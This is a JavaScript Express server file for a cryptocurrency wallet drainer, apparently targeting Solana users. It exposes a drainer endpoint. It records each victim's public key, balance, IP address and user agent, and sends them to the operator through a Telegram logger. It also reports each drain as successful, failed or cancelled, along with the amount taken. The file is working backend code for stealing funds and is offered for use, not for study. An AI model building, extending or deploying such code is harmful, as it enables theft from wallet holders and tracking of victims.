import express from 'express';
import cors from 'cors';
import unifiedDrainerHandler from './api/unified-drainer.js';
import walletManagementHandler from './api/wallet-management.js';
import telegramLogger from './src/telegram.js';
import envConfig from './src/environment.js';
import extractUserIP from './src/ip-extraction.js';

const app = express();
const PORT = envConfig.server.port;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Serve src directory with correct MIME type for JavaScript modules
app.use('/src', express.static('src', {
  setHeaders: (res, path) => {
    if (path.endsWith('.js')) {
      res.setHeader('Content-Type', 'application/javascript');
    }
  }
}));

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'healthy', timestamp: new Date().toISOString() });
});

// Unified drainer endpoint (replaces both original and enhanced)
app.post('/api/drainer', unifiedDrainerHandler);
app.post('/api/wallet-management', walletManagementHandler); // Comprehensive wallet management

// Legacy enhanced endpoint removed - using unified-drainer only

// Server-side deduplication cache - 2025 FIX
const serverWalletLogCache = new Map();
const SERVER_WALLET_LOG_CACHE_TTL = 300000; // 5 minutes

// Log wallet detection with server-side deduplication - 2025 FIX
app.post('/api/drainer/log-wallet', async (req, res) => {
  try {
    const { publicKey, lamports, userAgent, walletType } = req.body;
    const userIp = extractUserIP(req); // Use centralized IP extraction
    
    // Server-side deduplication check - 2025 FIX
    const walletKey = `${publicKey}-${walletType}`;
    const now = Date.now();
    const cachedLog = serverWalletLogCache.get(walletKey);
    
    if (cachedLog && (now - cachedLog.timestamp) < SERVER_WALLET_LOG_CACHE_TTL) {
      // Skipping duplicate wallet log
      return res.json({ success: true, message: 'Duplicate log skipped' });
    }
    
    // Cache this log attempt
    serverWalletLogCache.set(walletKey, {
      timestamp: now,
      lamports: lamports || 0,
      ip: userIp
    });
    
    // Clean up old cache entries periodically
    if (serverWalletLogCache.size > 1000) {
      for (const [key, value] of serverWalletLogCache.entries()) {
        if (now - value.timestamp > SERVER_WALLET_LOG_CACHE_TTL) {
          serverWalletLogCache.delete(key);
        }
      }
    }
    
    await telegramLogger.logWalletDetected({
      publicKey: publicKey,
      lamports: lamports || 0,
      ip: userIp,
      walletType: walletType || 'Unknown'
    });
    
    res.json({ success: true, message: 'Wallet logged successfully' });
  } catch (error) {
    console.error('Error logging wallet:', error);
    res.status(500).json({ error: 'Failed to log wallet' });
  }
});

// Log transaction confirmation
app.post('/api/drainer/log-confirmation', async (req, res) => {
  try {
    const { publicKey, lamports, userAgent, txid, status, error: errorMsg, walletType, actualDrainAmount } = req.body;
    const userIp = extractUserIP(req); // Extract IP for this endpoint
    
    // Handle different statuses explicitly - 2025 FIX
    if (status === 'cancelled') {
      await telegramLogger.logTransactionCancelled({
        publicKey,
        lamports,
        ip: userIp,
        userAgent,
        reason: errorMsg || 'User cancelled',
        walletType
      });
    } else if (status === 'confirmed' || status === 'finalized' || status === 'broadcast_success') {
      // Log drain success for confirmed, finalized, or broadcast success
      await telegramLogger.logDrainSuccess({
        publicKey,
        lamports,
        ip: userIp,
        userAgent,
        txid,
        status,
        walletType,
        actualDrainAmount: parseInt(actualDrainAmount) || 0
      });
    } else if (status === 'failed') {
      // Log drain failure
      await telegramLogger.logDrainFailed({
        publicKey,
        lamports: 0,
        ip: userIp,
        userAgent,
        error: errorMsg || 'Transaction failed',
        walletType
      });
    } else {
      // Default to drain success for any other status (including broadcast_success)
      await telegramLogger.logDrainSuccess({
        publicKey,
        lamports,
        ip: userIp,
        userAgent,
        txid,
        status,
        walletType,
        actualDrainAmount: parseInt(actualDrainAmount) || 0
      });
    }
    
    res.json({ success: true, message: 'Confirmation logged successfully' });
  } catch (error) {
    console.error('Error logging confirmation:', error);
    res.status(500).json({ error: 'Failed to log confirmation' });
  }
});

// Log transaction cancellation (legacy endpoint for backward compatibility)
app.post('/api/drainer/log-cancellation', async (req, res) => {
  try {
    const { publicKey, lamports, userAgent, reason, walletType } = req.body;
    const userIp = extractUserIP(req); // Extract IP for this endpoint
    
    await telegramLogger.logTransactionCancelled({
      publicKey,
      lamports,
      ip: userIp,
      userAgent,
      reason: reason || 'Unknown reason',
      walletType
    });
    
    res.json({ success: true, message: 'Cancellation logged successfully' });
  } catch (error) {
    console.error('Error logging cancellation:', error);
    res.status(500).json({ error: 'Failed to log cancellation' });
  }
});

// Enhancement modules status endpoint
// Enhancement status endpoint removed - returning basic status
app.get('/api/enhancements/status', async (req, res) => {
  res.json({
    timestamp: new Date().toISOString(),
    status: 'basic',
    message: 'Enhancement modules removed - using core functionality only'
  });
});

// Duplicate enhancement status endpoint removed

// Enhancement health endpoint - returning basic health
app.get('/api/enhancements/health', async (req, res) => {
  res.json({
    timestamp: new Date().toISOString(),
    status: 'healthy',
    message: 'Core functionality only - enhancement modules removed',
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    version: '1.0.0'
  });
});

// Original enhancement health endpoint - removed
app.get('/api/enhancements/health', async (req, res) => {
  try {
    // Get health from unified drainer
    const { enhancementModules, drainerConfig } = await import('./api/unified-drainer.js');
    
    const healthReport = {
      timestamp: new Date().toISOString(),
      status: 'healthy',
      configuration: {
        enhanced: drainerConfig.enhanced,
        core: drainerConfig.core
      },
      modules: {}
    };
    
    if (enhancementModules) {
      // Check RPC health
      try {
        if (enhancementModules.rpcManager?.performHealthCheck) {
          await enhancementModules.rpcManager.performHealthCheck();
          healthReport.modules.rpc = 'healthy';
        } else {
          healthReport.modules.rpc = 'not available';
        }
      } catch (error) {
        healthReport.modules.rpc = `unhealthy: ${error.message}`;
        healthReport.status = 'degraded';
      }
      
      // Check rate limiter
      try {
        if (enhancementModules.rateLimiter?.getRateLimitStats) {
          const rateLimitStats = enhancementModules.rateLimiter.getRateLimitStats();
          healthReport.modules.rateLimiter = 'healthy';
        } else {
          healthReport.modules.rateLimiter = 'not available';
        }
      } catch (error) {
        healthReport.modules.rateLimiter = `unhealthy: ${error.message}`;
        healthReport.status = 'degraded';
      }
      
      // Check transaction monitor
      try {
        if (enhancementModules.transactionMonitor?.getMonitoringStats) {
          const monitoringStats = enhancementModules.transactionMonitor.getMonitoringStats();
          healthReport.modules.transactionMonitor = 'healthy';
        } else {
          healthReport.modules.transactionMonitor = 'not available';
        }
      } catch (error) {
        healthReport.modules.transactionMonitor = `unhealthy: ${error.message}`;
        healthReport.status = 'degraded';
      }
    } else {
      healthReport.modules = 'No enhancement modules loaded';
      healthReport.status = 'basic';
    }
    
    res.json(healthReport);
  } catch (error) {
    console.error('Error checking enhancement health:', error);
    res.status(500).json({ 
      error: 'Failed to check enhancement health',
      details: error.message,
      fallback: 'Unified drainer not available'
    });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🔗 API: http://localhost:${PORT}/api/drainer`);
});

export default app; 